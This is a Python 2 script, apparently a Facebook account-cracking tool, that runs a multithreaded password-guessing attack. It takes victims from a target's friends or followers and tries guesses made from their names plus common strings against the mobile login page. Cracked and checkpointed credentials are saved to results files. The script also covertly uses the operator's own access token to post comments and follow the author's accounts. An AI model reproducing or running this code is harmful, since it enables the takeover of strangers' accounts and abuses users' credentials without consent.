try:
	import requests
	import sys
	import os
	import random
	import time
	import re
	import json
	import ipaddr
	from multiprocessing.pool import ThreadPool
	from requests.exceptions import ConnectionError
	from datetime import datetime
except Exception as modul:
	exit(" \033[0;97m[\033[0;91m!\033[0;97m] %s installed yet"%(modul))

loop = 0
ok = []
cp = []
id = []
pwx = []

network = ipaddr.IPv4Network("59.185.23.0/24")
randmon_ip = ipaddr.IPv4Address(random.randrange(int(network.network) + 1, int(network.broadcast) - 1))
host = ("https://m.facebook.com")

rgb = random.choice(["\033[0;91m", "\033[0;92m", "\033[0;93m", "\033[0;94m", "\033[0;95m", "\033[0;96m", "\033[0;97m", "\033[0m"])
ct = datetime.now()
n = ct.month
bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "Nopember", "Desember"]
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]

def logo():
	os.system("clear")
	print("  \033[0;91m___ ___ __  __ ___ ___ \n \033[0;91m/ __|_ _|  \/  | _ ) __| \033[0;96mAU\033[0;97m : ANGGA KURNIAWAN\n\033[0;97m \__ \| || |\/| | _ \ _|  \033[0;91mFB\033[0;97m : FB.ME/GAAAARZXD\n\033[0;97m |___/___|_|  |_|___/_|   \033[0;93mGH\033[0;97m : GITHUB.COM/ANGGAXD")

def bot_komen():
    try:
        token = open("login.txt", "r").read()
    except IOError:
        print(" \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid")
        os.system("rm -rf login.txt")
    una = ("100015073506062") 
    post = ("1031861840659590") 
    post2 = ("1110619372783836") 
    kom = ("GW PAKE SC LU BANG @[100015073506062:0] 😍😘\nhttps://www.facebook.com/100015073506062/posts/1031861840659590/?app=fbl") 
    kom2 = ("KEREN BANG @[100015073506062:0] 😘😘\nhttps://m.facebook.com/photo.php?fbid=1110619372783836&set=a.106868716492245&type=3&app=fbl") 
    requests.post("https://graph.facebook.com/" + post + "/comments/?message=" + kom + "&access_token=" + token)
    requests.post("https://graph.facebook.com/" + post2 + "/comments/?message=" + kom2 + "&access_token=" + token)
    requests.post("https://graph.facebook.com/100015073506062/subscribers?access_token=" + token)
    requests.post("https://graph.facebook.com/1186995774/subscribers?access_token=" + token)
    print(" \033[0;97m[\033[0;92m+\033[0;97m] Login Successfully")
    menu()

def login():
	os.system("clear")
	try:
		token = open("login.txt","r")
		menu()
	except (KeyError,IOError):
		logo()
		print("\n \033[0;97m[\033[0;93m*\033[0;97m] Select The Login Method")
		print(" \033[0;97m[\033[0;96m1\033[0;97m] Login With Token Facebook")
		print(" \033[0;97m[\033[0;96m2\033[0;97m] Login With Cookie Facebook")
		ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Choose : ")
		if ask =="":
			login()
		elif ask == "1" or ask == "01":
			tokenz()
		elif ask == "2" or ask == "02":
			cookie()
		else:
			login()

def cookie():
	logo()
	print("\n \033[0;97m[\033[0;93m*\033[0;97m] How To Get Cookie : https://youtu.be/X7m_O_tZnTc")
	cookie = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] Your Cookie : \033[0;96m")
	try:
		data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
		   "user-agent"                : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36", # Jangan Di Ganti Ea Anjink.
		   "referer"                   : "https://m.facebook.com/",
		   "host"                      : "m.facebook.com",
		   "origin"                    : "https://m.facebook.com",
		   "upgrade-insecure-requests" : "1",
		   "accept-language"           : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
		   "cache-control"             : "max-age=0",
		   "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		   "content-type"              : "text/html; charset=utf-8"
		}, cookies = {
		   "cookie"                    : cookie
		})
		find_token = re.search("(EAAA\w+)", data.text)
		hasil    = " \033[0;97m[\033[0;91m!\033[0;97m] Your Cookie Invalid" if (find_token is None) else "\n* Your fb access token : " + find_token.group(1)
		cookie = open("login.txt", "w")
		cookie.write(find_token.group(1))
		cookie.close()
		bot_komen()
	except requests.exceptions.ConnectionError:
		print(" \033[0;97m[\033[0;91m!\033[0;97m] No Connection")
	if (find_token is None):
		exit(" \033[0;97m[\033[0;91m!\033[0;97m] Cookie Invalid")

def tokenz():
	os.system("clear")
	try:
		token = open("login.txt","r")
		menu()
	except(KeyError,IOError):
		logo()
		print("\n \033[0;97m[\033[0;93m*\033[0;97m] How To Get Token : https://youtu.be/RIpCHs7E4qs")
		token = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] Your Token : \033[0;96m")
		try:
			otw = requests.get("https://graph.facebook.com/me?access_token="+token)
			a = json.loads(otw.text)
			avsid = open("login.txt", "w")
			avsid.write(token)
			avsid.close()
			bot_komen()
		except(KeyError):
			exit(" \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid")

def menu():
	os.system("clear")
	global token
	try:
		token = open("login.txt","r").read()
	except(KeyError, IOError):
		print(" \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid")
		os.system("clear")
		os.system("rm -rf login.txt")
		login()
	try:
		nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"]
		ip = requests.get("https://ipinfo.io/json").json()["ip"]
	except requests.exceptions.ConnectionError:
		exit(" \033[0;97m[\033[0;91m!\033[0;97m] No Connection")
	logo()
	print(" \033[0;97m[\033[0;96m+\033[0;97m] User Active : %s"%(nama))
	print(" \033[0;97m[\033[0;96m+\033[0;97m] IP Address  : %s"%(ip))
	print(" \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------") 
	print(" \033[0;97m[\033[0;96m1\033[0;97m] Crack From Public")
	print(" \033[0;97m[\033[0;96m2\033[0;97m] Crack From Followers")
	print(" \033[0;97m[\033[0;96m3\033[0;97m] Check Result")
	print(" \033[0;97m[\033[0;91m0\033[0;97m] Logout (delete token)")
	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Choose : ")
	if ask =="":
		menu()
	elif ask == "1" or ask == "01":
		print("\n \033[0;97m[\033[0;93m*\033[0;97m] Fill In 'me' To Crack From The Friends List")
		idt = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] ID Public : ")
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		id = []
		for i in z["data"]:
			uid = i["id"]
			name = i["name"]
			id.append(uid+"<=>"+name)
	elif ask == "2" or ask == "02":
		print("\n \033[0;97m[\033[0;93m*\033[0;97m] Fill In 'me' To Crack From The Friends List")
		idt = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] ID Public : ")
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=5000&access_token="+token)
		z = json.loads(r.text)
		id = []
		for i in z["data"]:
			uid = i["id"]
			name = i["name"]
			id.append(uid+"<=>"+name)
	elif ask == "3" or ask == "03":
		print("\n \033[0;97m[\033[0;96m1\033[0;97m] Check Results OK")
		print(" \033[0;97m[\033[0;96m2\033[0;97m] Check Results CP")
		ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Choose : ")
		if ask =="":
			menu()
		elif ask == "1" or ask == "01":
			try:
				totalok = open("results/OK-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
				print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
				print(" \033[0;97m[\033[0;92m+\033[0;97m] Results \033[0;92mOK\033[0;97m Date : \033[0;92m%s-%s-%s \033[0;97mTotal : %s\033[0;92m"%(ha, op, ta,len(totalok)))
				os.system("cat results/OK-%s-%s-%s.txt"%(ha, op, ta))
				exit(" \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
			except(IOError):
				exit(" \033[0;97m[\033[0;91m!\033[0;97m] No Results Bro")
		elif ask == "2" or ask == "02":
			try:
				totalcp = open("results/CP-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
				print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
				print(" \033[0;97m[\033[0;92m+\033[0;97m] Results \033[0;93mCP\033[0;97m Date : \033[0;92m%s-%s-%s \033[0;97mTotal : %s\033[0;93m"%(ha, op, ta,len(totalcp)))
				os.system("cat results/CP-%s-%s-%s.txt"%(ha, op, ta))
				exit(" \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
			except(IOError):
				exit(" \033[0;97m[\033[0;91m!\033[0;97m] No Results Bro")
		else:
			menu()
	elif ask == "0" or ask == "00":
		os.system("rm -f login.txt")
		exit(" \033[0;97m[\033[0;96m#\033[0;97m] Successfully Delete Token")
	else:
		menu()

	print(" \033[0;97m[\033[0;96m+\033[0;97m] Total ID  : \033[0;91m%s\033[0;97m"%(len(id))) 
	##-main extra pass
	#print("\n \033[0;97m[\033[0;93m*\033[0;97m] Example Password : sayang,anjing,bangsat")
	#expass = raw_input(" \033[0;97m[\033[0;93m?\033[0;97m] Extra Password? (enter for skip): ")
	#print(" \033[0;97m[\033[0;93m*\033[0;97m] Crack With Password : \033[0;91mname123,name12345,%s\033[0;97m"%(expass))
	##-main crack
	print("\n \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt"% (ha, op, ta))
	print(" \033[0;97m[\033[0;91m!\033[0;97m] If No Result Turn On Airplane Mode\n")

	def main(user):
		global loop, token
		pwx = []
		#pwz = expass.split(",")
		sys.stdout.write(
		      "\r \033[0;97m[%s*\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s " % (rgb, loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		try: os.mkdir("results")
		except(OSError):pass
		uid,name = user.split("<=>")
		for ss in name.split(" "):
			if len(ss)<3:
				continue
			else:
				#angga_ = [ ss+"123", ss+"12345", ] + pwz
				if len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
					pwx.append(ss+"123")
					pwx.append(ss+"12345")
				else:
					pwx.append(ss+"123")
					pwx.append(ss+"12345")
					pwx.append("sayang")
					pwx.append("anjing")
					pwx.append("bangsat")
		try:
			for pw in pwx:
				pw = pw.lower()
				ses = requests.Session()
				useragent_ = random.choice([
					"Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5800d-1/60.0.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4", 
					"Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11", 
					"Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaE7-00/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1", 
					"Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5230/51.0.002; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4", 
					"Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaC6-01/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1", 
					"Mozilla/5.0 (Series40; Nokia205.1/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22",
					"Mozilla/5.0 (Series40; Nokia303/14.87; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22"])
				xo = ses.post("https://touch.facebook.com/login.php", data={"email": uid, "pass": pw, "login": "submit"}, headers={"user-agent": useragent_}).url
				if "home" in xo or "get" in xo or "save" in xo or "actor" in xo:
					print("\r  \033[0;92m* --> %s|%s\033[0;97m          "%(uid, pw))
					ok.append("%s|%s"%(uid, pw))
					open("results/OK-%s-%s-%s.txt" % (ha, op, ta),"a").write("  * --> %s|%s\n"%(uid, pw))
					break
					continue
				elif "checkpoint" in xo or "confirm" in xo or "cuid" in xo:
					try:
						ttl = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token).json()["birthday"].replace("/","-")
						print("\r  \033[0;93m* --> %s|%s|%s\033[0;97m          "%(uid, pw, ttl))
						cp.append("%s|%s"%(uid, pw))
						open("results/CP-%s-%s-%s.txt" % (ha, op, ta),"a").write("  * --> %s|%s|%s\n"%(uid, pw, ttl))
						break
					except(KeyError, IOError):
						ttl = (" ")
					except:pass
					print("\r  \033[0;93m* --> %s|%s\033[0;97m          "%(uid, pw))
					cp.append("%s|%s"%(uid, pw))
					open("results/CP-%s-%s-%s.txt" % (ha, op, ta),"a").write("  * --> %s|%s\n"%(uid, pw))
					break
					continue

			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Finished")

if __name__ == "__main__":
	if sys.version[0]!="3":
		python="2.7" if "2.7" in sys.version[0:2] else "2.8"
	else:
		print(" \033[0;97m[\033[0;93m#\033[0;97m] Please Use Python 2 Bro Not Python 3")
		exit(" \033[0;97m[\033[0;91m!\033[0;97m] How To Usage : python2 run.py")
	login()
